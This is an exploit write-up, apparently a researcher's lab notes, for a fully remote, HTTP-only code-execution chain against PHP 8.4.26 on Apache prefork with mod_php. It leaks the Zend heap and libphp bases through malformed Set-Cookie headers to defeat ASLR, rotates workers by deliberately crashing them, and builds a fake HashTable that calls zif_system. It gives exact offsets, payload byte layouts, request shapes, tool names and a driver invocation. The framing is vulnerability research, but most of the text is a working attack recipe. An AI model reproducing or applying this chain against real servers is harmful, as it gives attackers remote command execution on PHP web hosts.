# Pure-HTTP ASLR RCE: Two Set-Cookie Leaks + zif_system

Date: 2026-10-21
Target: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (Debian 12 amd64, `172.16.0.103`)
Constraints: **Fully remote, HTTP only; the target webroot contains only an ordinary page (no target-specific PHP files).**
Status: **The full ASLR-on chain works, and every end-to-end attack request is pure HTTP: 9/10 in the lab with initial rotation and 5/5 without it.** The two pure-HTTP leaks provide the Zend MM chunk base and libphp base; the final stage uses `zif_system` and does not need libc. Worker rotation between stages is also triggered over HTTP: `A_bigfields` (3 MB of live POST fields + OOM) corrupts the Zend MM heap; a following B request that initializes a session causes the child to exit with `SIGABRT`, after which prefork forks a new worker with the same address-space mappings.

> In this document, “pure HTTP” means that the **attack request chain** uses only HTTP. The lab driver still restarts Apache at the beginning to get a clean master and reads the proof with `cat /tmp/p1`; those are lab setup/checks, not part of the attack chain. The attack itself (leak, rotation, execution) uses no local signals.

---

## 1. Result

Three request pairs, each an ordinary multipart POST to `index.php`:

| Stage | Request A | Request B | Result |
|---|---|---|---|
| 1 | `send_a_leak2.py 1001 12` | `b_numleak2.py 892 1 0x1000` | Zend MM chunk base |
| 2 | `send_a_leak3.py 1001 5 39 12 17` | `b_target.py 443 16 983` | libphp base |
| 3 | `send_a_pad.py 17 19 3 12` + `8:7` + 5×`7:7` | `send_b_zif.py 15 2 <HT> <ZIF>` | `id>/tmp/p1` |

Stage 1's mechanism and evidence are in [HTTP_HEAP_LEAK.md](HTTP_HEAP_LEAK.md). This document records stages 2 and 3 and the complete driver.

Measured with ASLR enabled (`personality=00000000`):

~~~text
W1=869675 chunk=0x7f4922200000 attempt=1
W2=869737 libphp=0x7f4923a00000 attempt=1
W3=869807 HTDATA=0x7f492226e0d8 ZIF=0x7f4923e3a870 attempt=1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
FULL_CHAIN_OK=5/5            # no initial rotation; worker is fresh after restart
FULL_PURE_HTTP_OK=9/10       # includes initial HTTP rotation, independent of prior history
~~~

Rotation primitive measurements:

~~~text
A_bigfields + session B -> child exit signal Abort (6) -> prefork respawn
10/10 on a fresh worker; 5/5 after leaks; 5/5 after rotation followed by heap leak
~~~

The stage 2 libphp leak under ASLR exactly matches `/proc/<worker>/maps`:

~~~text
Set-Cookie: PHPSESSID=%10%00%00%00%00%00%00%00P%3C%A1%87r%7F%00%00
decoded: 10 00 00 00 00 00 00 00 | 50 3c a1 87 72 7f 00 00
pDestructor = 0x7f7287a13c50
libphp      = 0x7f7287400000
maps: 7f7287400000-7f728754f000 r--p ... /usr/lib/apache2/modules/libphp.so
~~~

---

## 2. Stage 2: Pure-HTTP Leak of a libphp Code Pointer

### 2.1 Idea

Stage 1 showed that we can control the stale `PS(id)` length and make `php_url_encode` read out of bounds. This stage changes the read source to a **56-byte HashTable page** and derives `len` from a **small integer field** in that HashTable, instead of forging a huge length:

- B lays many 56-byte HashTable pages throughout the chunk using nested arrays `aNNNN[k]`. Each page contains 73 HashTables, with `pDestructor = ZVAL_PTR_DTOR = libphp + 0x613c50`.
- A's shape (1001 fields with 39-byte values) places stale `PS(id)` at `chunk + 0xb7400` (page `0xb7000`, offset `+0x400`).
- In B's layout, this address is exactly `+0x20` in the HashTable for `$_POST['a0443']`. Reading `PS(id)+0x10` therefore yields `nTableSize | nInternalPointer`.
- Expand `a0443` to 16 elements (`nTableSize=16`, `nInternalPointer=0`), giving `ZSTR_LEN(PS(id)) = 16`. Data begins at `PS(id)+0x18`, which covers `nNextFreeElement` (8B) and `pDestructor` (8B).

Layout relative to the chunk base:

~~~text
PS(id)          = chunk + 0xb7400
PS(id)+0x10     = HT + 0x20 -> nTableSize(16) | nInternalPointer(0) = 16 (len)
PS(id)+0x18     = HT + 0x28 -> nNextFreeElement (0x10)
HT + 0x30       = pDestructor = ZVAL_PTR_DTOR (libphp+0x613c50)
~~~

Constraints for `b_target.py`:

~~~text
983 arrays a0000..a0982; a0443 has 16 elements, all others have 1
Total fields = 982 + 16 = 998; plus PHPSESSID/PROGRESS gives 1000 POST variables
=> B does not trigger its own max_input_vars warning (which would set headers_sent and prevent the cookie from being sent)
~~~

### 2.2 Calibration (no-ASLR)

- After `send_a_leak3.py 1001 5 39 12 17`, `ps_globals.id = 0x7ffff5eb7400` (chunk+0xb7400), and `send_cookie=1`.
- In the raw B request with 998 `aNNNN[0]` nested-array fields, chunk page `0xb7000` is a 56-byte HashTable page. The HashTable at offset `+0x3f0` belongs to `$_POST['a0443']` (identified by tracing the parent bucket's key `a0443`).
- After expanding `a0443` to 16 elements while keeping all others at 1, `Set-Cookie` changes from the normal 32-character id to:

  ~~~text
  %10%00%00%00%00%00%00%00P%3C%A1%F4%FF%7F%00%00
  => nNextFreeElement=0x10 | pDestructor=0x7ffff4a13c50
  ~~~

- This `pDestructor` is libphp's `ZVAL_PTR_DTOR` (`zval_ptr_dtor`), at offset `0x613c50`. The libphp base is 2 MB aligned, which provides a leak check:
  `(pDestructor - 0x613c50) & 0x1fffff == 0` and `pDestructor & 0x1fffff == 0x13c50`.

### 2.3 Request Details

A (`send_a_leak3.py 1001 5 39 12 17`):

- 1001 ordinary fields (5-character names, 39-byte values); the 1001st triggers a `max_input_vars` warning (`display_errors=On` → `headers_sent=1`).
- `PHPSESSID` is a single-byte `\x00`; FILE_START creates a new random id and sets `send_cookie=1`, then `php_session_reset_id` fails because headers were sent.
- The file field + 12 MB field triggers OOM; `PS(id)` is dangling at `chunk+0xb7400`.

B (`b_target.py 443 16 983`):

- No file field; pre-RINIT END cleanup calls `php_session_initialize()`.
- `reset_id` uses the stale `PS(id)` to send `Set-Cookie`.
- `php_url_encode(ZSTR_VAL(id), ZSTR_LEN(id))` reads 16 bytes: `nNextFreeElement` + `pDestructor`.
- Then `ps_files_open` rejects the id and emits `Session ID is too long or contains illegal characters`; this does not affect the already-sent response header.

---

## 3. Stage 3: The `zif_system` Endpoint

### 3.1 Why It Does Not Need libc

Stages 1 and 2 leak only the heap and libphp; the chunk scan found no libc pointers. The final stage therefore uses PHP's own internal function handler `zif_system` (libphp + `0x43a870`), without needing a `system`/libc address.

Calling convention for `zif_system(zend_execute_data *execute_data, zval *return_value)`:

- `pDestructor(&bucket->val)` deterministically provides only `rdi = &bucket->val`.
- Make `&bucket->val` look like a `zend_execute_data` with `num_args=1` and an `arg1` pointing to a fake `zend_string` (the command) through a zval.
- After executing the command, `zif_system` may crash while writing its return value through uncontrolled `rsi`, but the command has already run (same behavior as the g18 `/proc/self/maps` version).

### 3.2 Compact Payload (167 Bytes, All Within a Live 192B zend_string)

Exploit B places the fake HashTable inside a live 167-byte field-value string at `chunk + 0x6e0d8`. A 55-byte raw buffer for the fake reference overwrites the stale reference at `R0 = chunk + 0x24e0`.

~~~text
data+0x00: gc refcount=1, type=IS_ARRAY(7)
data+0x08: flags=0x10, nTableMask=0xfffffff8
data+0x10: arData = data+0x20
data+0x18: nNumUsed=1, nNumOfElements=1
data+0x20: nTableSize=8, nInternalPointer=0
data+0x28: nNextFreeElement=0
data+0x30: pDestructor = zif_system          (== execute_data+0x10)
data+0x20: execute_data E (0x50 bytes)
  E+0x10: return_value = zif_system          (overlaps HT pDestructor)
  E+0x2C: num_args = 1
  E+0x50: arg1 zval { value=data+0x80, type=IS_STRING(6) }
data+0x80: fake zend_string { gc 1/0x106, h=0, len=10, chars at 0x98 }
data+0x98: "id>/tmp/p1\0"
~~~

Fake reference (55-byte raw buffer starting at `R0-0x10`):

~~~text
+0x10: gc refcount=1, type=IS_REFERENCE(10)
+0x18: val.value = chunk+0x6e0d8
+0x20: val.type  = 0x307 (IS_ARRAY_EX)
+0x28: sources   = 0
~~~

Call chain:

~~~text
php_session_track_init()
  zval_ptr_dtor(PS(http_session_vars))     # refcount 1 -> 0
    zend_reference_destroy(R0)
      zval_ptr_dtor(&ref->val)             # IS_ARRAY_EX
        zend_array_destroy(fake HT)
          zend_hash_destroy(fake HT)
            pDestructor(&bucket->val)      # = zif_system
              zif_system(execute_data)     # "id>/tmp/p1"
~~~

### 3.3 Exploit Request Shape (Calibrated with `use_cookies=1`)

- A: `send_a_pad.py 17 19 3 12 8:7 7:7 7:7 7:7 7:7 7:7`
  - Six pads place dangling reference `R0 = chunk + 0x24e0`; `R0-0x10` is the start of the 56B block.
- B: `send_b_zif.py 15 2 <HTDATA> <ZIF> "id>/tmp/p1"`
  - With `N1=15` (31-character priming fields), the 55B fake-reference raw buffer lands at `R0-0x10`.
  - `HTDATA = chunk+0x6e0d8` (data of the live 167B string).
  - `ZIF = libphp+0x43a870`.

> Changing `use_cookies` from 0 to 1 moves B's 56B landing point from `N1=16` to `N1=15` and changes some offsets in leak A. All values above were measured with `use_cookies=1`.

---

## 4. Full Driver

`tools/pure_aslr_run.sh`:

1. Restart Apache (ASLR enabled, one-worker prefork).
2. Stage 1: `send_a_leak2 + b_numleak2`; parse the chunk base from `Set-Cookie` (mode of 2 MB-aligned values); retry up to 3 times.
3. Rotate the worker over HTTP: `send_a_bigfields 1001 3000 12 17` → `sup_poc.py b`, then wait for prefork to fork a new child.
4. Stage 2: `send_a_leak3 + b_target`; parse `pDestructor` and validate `p & 0x1fffff == 0x13c50`; retry up to 3 times.
5. Rotate the worker again (same method).
6. Stage 3: `send_a_pad + send_b_zif`; check `/tmp/p1`; retry up to 5 times.

The driver also performs an HTTP rotation before stage 1 by default. This removes any existing child history so the first-stage layout depends only on this chain's requests.

~~~bash
# On the target host
cd ~/php2shell-work
CMD="id>/tmp/p1" bash pure_aslr_run.sh
~~~

Measured output (5/5):

~~~text
W1=... chunk=0x...
W2=... libphp=0x...
W3=... HTDATA=0x... ZIF=0x... attempt=1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

Archived evidence: `logs/pure_http_aslr_20261021.txt`; raw libphp leak response: `logs/libphp_leak_20261021.resp`.

---

## 5. Worker Rotation and ASLR Base Stability

- Under the same Apache master, prefork workers inherit the same **libphp/libc** mappings. Zend MM maps its chunk on the worker's first request; measurements show both the chunk base and libphp base remain unchanged after restarting a worker:

  ~~~text
  W1 chunk=0x7f5555e00000 libphp=0x7f5553a00000
  W2 chunk=0x7f5555e00000 libphp=0x7f5553a00000   # child was aborted and forked again
  ~~~

- Each stage needs a **fresh worker** because the A/B offsets were calibrated on a worker's first request. Once a worker has handled a leak request, A's dangling-reference address moves (measured `R0` from `chunk+0x24e0` to `chunk+0x14e0`), invalidating the old B landing point.
- **Pure-HTTP rotation (implemented):** `A_bigfields` sends 1001 ordinary fields (the first 1000 are registered in `$_POST`, each 3000 bytes) → FILE_START creates a new id → a 12 MB field triggers OOM. The 3 MB of live strings plus OOM corrupts Zend MM state. Immediately follow with a B request that initializes a session (`sup_poc.py b`: PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS, no file field, pre-RINIT END cleanup). This triggers `zend_mm_panic`/`abort()`; the child exits with **SIGABRT**, and prefork immediately forks a new child. Log confirmation:

  ~~~text
  [core:notice] child pid ... exit signal Abort (6)
  ~~~

  Measurements: 10/10 on a fresh worker, 5/5 after leaks, and 5/5 after rotation followed by another heap leak.
- The rotated child shares mmap layout with the old child under the same master, so chunk and libphp bases remain unchanged. This makes “leak once, rotate workers, continue” possible.
- The default driver also performs an HTTP rotation before stage 1 so that even if the target worker has handled unknown prior requests, stage 1's layout depends only on this chain.

---

## 6. Limits

1. Requires `display_errors=On` (A in stages 1/2 needs warning output to set `headers_sent=1`).
   > Update, 2026-10-21: an OOM-in-cookie variant that does not depend on `display_errors` now OOMs inside `php_session_send_cookie→php_url_encode` (empty bin 128 + exhausted free page) and gets B past stale `PS(mod_data)` to call `send_cookie` with the stale id. The remaining work is calibrating the stale-id forge. See [DISPLAY_ERRORS_OFF.md](DISPLAY_ERRORS_OFF.md).
2. Requires `session.use_cookies=1` (default), `session.use_strict_mode=0` (default), `max_input_vars=1000` (default), and `memory_limit=8M` (lab).
3. All chunk/module offsets depend on this PHP 8.4.26 build and request shape:

   ~~~text
   chunk+0xb7400   stage 2 stale PS(id)
   chunk+0xb73f0   target HashTable (a0443)
   chunk+0x6e0d8   stage 3 fake HashTable string data
   chunk+0x24e0    stage 3 stale reference R0
   libphp+0x613c50 ZVAL_PTR_DTOR
   libphp+0x43a870 zif_system
   ~~~

   Recalibrate with the GDB methods in `logs` after changing the build, field lengths, or request order. These offsets are relative to the chunk/module and independent of ASLR.
4. The worker crashes in cleanup `pefree` inside `zend_hash_destroy` after command execution. The proof has already been written; this is expected for a one-shot exploit.
5. Stage 1 and stage 2 use different A shapes, but both rely on the same “headers_sent + empty PHPSESSID + OOM” primitive. A must be the worker's first request for each stage. HTTP rotation provides a fresh state: `send_a_bigfields.py 1001 3000 12 17` (about 3 MB request of fields) + `sup_poc.py b`. This rotation relies on `memory_limit=8M` to OOM on the 12 MB field and on the next request triggering abort during Zend MM cleanup.
6. Success rate in the lab with ASLR on: **5/5** without initial rotation; **9/10** with initial rotation to remove dependence on prior history. Failures are mainly timing/retry issues; the driver retries each stage.
7. If the target has a high `memory_limit`, the trailing field in `A_bigfields` must be larger to trigger OOM. Rotation requires both heap exhaustion/corruption and a session-initializing request that triggers abort; recalibrate both for the target settings.

---

## 7. Files

| File | Purpose |
|---|---|
| `tools/pure_aslr_run.sh` | Full driver (leak → rotate → exploit, with checks/retries) |
| `tools/send_a_leak2.py` | Stage 1 A (heap leak setup) |
| `tools/b_numleak2.py` | Stage 1 B (80B raw forge + out-of-bounds read) |
| `tools/decode_leak.py` | Decode stage 1 response/chunk base |
| `tools/send_a_leak3.py` | Stage 2 A (`PS(id)=chunk+0xb7400`) |
| `tools/b_target.py` | Stage 2 B (expand a0443 to 16 elements → leak pDestructor) |
| `tools/send_a_pad.py` | Stage 3 A (six pads + file + OOM) |
| `tools/send_b_zif.py` | Stage 3 B (compact zif_system payload) |
| `tools/send_b_rce2.py` | Older system endpoint (no-ASLR baseline/crash experiments) |
| `tools/send_a_bigfields.py` | HTTP rotation A (3 MB live fields + OOM) |
| `tools/sup_poc.py` | HTTP rotation B (session initialization triggers SIGABRT) |
| `tools/b_crash7.py` | Early HTTP crash primitive experiment (7-character live string) |
| `logs/http_heap_leak_20261021.resp/.txt` | Stage 1 raw response/decode |
| `logs/libphp_leak_20261021.resp` | Stage 2 raw response |
| `logs/pure_http_aslr_20261021.txt` | Full pure-HTTP run log (5/5, 9/10) |

---

## 8. Disclaimer

For vulnerability research and reproduction in authorized environments only. Request shapes, bin sequences, and offsets depend on this lab's PHP 8.4.26 build and Apache/mod_php settings; recalibrate after changing the build or configuration.
